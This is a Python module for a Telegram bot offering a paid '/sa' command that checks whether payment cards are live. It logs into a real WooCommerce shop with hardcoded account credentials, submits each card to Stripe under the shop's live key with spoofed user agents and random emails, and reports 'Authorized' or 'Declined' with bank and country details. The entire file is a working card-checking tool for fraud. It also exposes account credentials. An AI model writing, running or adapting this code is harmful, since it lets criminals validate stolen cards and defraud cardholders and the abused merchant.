import time
import re
import aiohttp
import requests
import random
import string
import traceback
import asyncio
from concurrent.futures import ThreadPoolExecutor
from EQUROBOT import app
from config import OWNER_ID
from pyrogram.enums import ParseMode
from EQUROBOT.core.mongo import has_premium_access
from pyrogram import filters
from fake_useragent import UserAgent
from requests.exceptions import RequestException

def random_string(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def clear_cookies(session):
    session.cookies.clear()

aiohttp_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with aiohttp_session.get(url, timeout=10) as response:
            if response.status == 200:
                bin_info = await response.json()
                return (
                    bin_info.get("brand", "N/A"),
                    bin_info.get("type", "N/A"),
                    bin_info.get("level", "N/A"),
                    bin_info.get("bank", "N/A"),
                    bin_info.get("country_name", "N/A"),
                    bin_info.get("country_flag", ""),
                )
            else:
                return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
    except aiohttp.ClientError:
        return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

executor = ThreadPoolExecutor(max_workers=5)

async def check_card(session, card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    user_agent = UserAgent().random
    headers = {
        'User-Agent': user_agent,
        'Pragma': 'no-cache',
        'Accept': '*/*',
    }

    email = random_string() + "@gmail.com"

    try:
        response = session.get("https://handtoolessentials.com/my-account/payment-methods/", headers=headers, timeout=3)
        response.raise_for_status()
        n_start = response.text.index('woocommerce-login-nonce" value="') + len('woocommerce-login-nonce" value="')
        n_end = response.text.index('"', n_start)
        nonce = response.text[n_start:n_end]
    except (ValueError, RequestException) as e:
        return f"Failed to extract login nonce or request failed: {str(e)}"

    login_data = {
        'username': "charlotte999251",
        'password': "RAJNISHAYUSHI*1+",
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method',
        'login': 'Log in',
    }

    try:
        response = session.post("https://handtoolessentials.com/my-account/payment-methods/", headers=headers, data=login_data, timeout=3)
        response.raise_for_status()
    except RequestException as e:
        return f"Login failed: {str(e)}"

    try:
        m_start = response.text.index('add_card_nonce":"') + len('add_card_nonce":"')
        m_end = response.text.index('","', m_start)
        add_card_nonce = response.text[m_start:m_end]
    except ValueError:
        return "Failed to extract add card nonce."

    stripe_data = {
        'type': 'card',
        'billing_details[name]': '',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': random_string(32),
        'muid': random_string(32),
        'sid': random_string(32),                    
        'payment_user_agent': 'stripe.js/2F0f84b1fa113B; stripe-js-v3/2F0f84b1fa113B; split-card-element',
        'referrer': 'https://handtoolessentials.com',
        'time_on_page': str(random.randint(10000, 50000)),  
        'key': "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
    }

    try:
        stripe_response = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=stripe_data, timeout=3)
        stripe_response.raise_for_status()
        stripe_json = stripe_response.json()
    except (RequestException, ValueError) as e:
        return f"Stripe payment method creation failed: {str(e)}"

    if 'id' not in stripe_json:
        return f"Failed to create payment method. Reason: {stripe_json.get('error', {}).get('message', 'Unknown error')}"

    stripe_id = stripe_json['id']
    print('Payment ID Creation ✅', stripe_id)

    confirm_data = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
        'stripe_source_id': stripe_id,
        'nonce': add_card_nonce,
    }

    try:
        confirm_response = session.post(
            "https://handtoolessentials.com/?wc-ajax=wc_stripe_create_setup_intent",
            headers=headers, 
            data=confirm_data, 
            timeout=8
        )
        confirm_response.raise_for_status()
        confirm_json = confirm_response.json()

        if 'error' in confirm_json:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = confirm_json["error"]["message"]
        elif confirm_json.get('status') == 'success':
            status = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅"
            resp = "Approved"
        elif confirm_json.get('status') == 'requires_action':
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = "Requires OTP."
        else:
            status = "Unknown"
            resp = "No valid response received."

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        execution_time = time.time() - start_time
        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )
        return final_response

    except (RequestException, ValueError) as e:
        return f"Stripe payment confirmation failed: {str(e)}"

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

@app.on_message(filters.command("sa", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    card_text = None

    if message.reply_to_message:
        card_match = re.search(card_pattern, message.reply_to_message.text)
        if card_match:
            card_text = card_match.group()
    else:
        try:
            card_text = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            await message.reply("Please provide card details in the format: `card_number|mm|yy|cvv`")
            return

    if not card_text:
        await message.reply("No valid card details provided.")
        return

    if not card_pattern.fullmatch(card_text):
        await message.reply("Invalid card format. Please provide card details in the format: `card_number|mm|yy|cvv`")
        return

    processing_msg = await message.reply("Processing your request...")

    async def process_check():
        try:
            response = await check_card(requests.Session(), card_text, message)
            await processing_msg.edit_text(response)

        except Exception as e:
            error_details = traceback.format_exc()
            await processing_msg.edit_text(f"An error occurred while processing the card: {str(e)}\n{error_details}")

    asyncio.create_task(process_check())
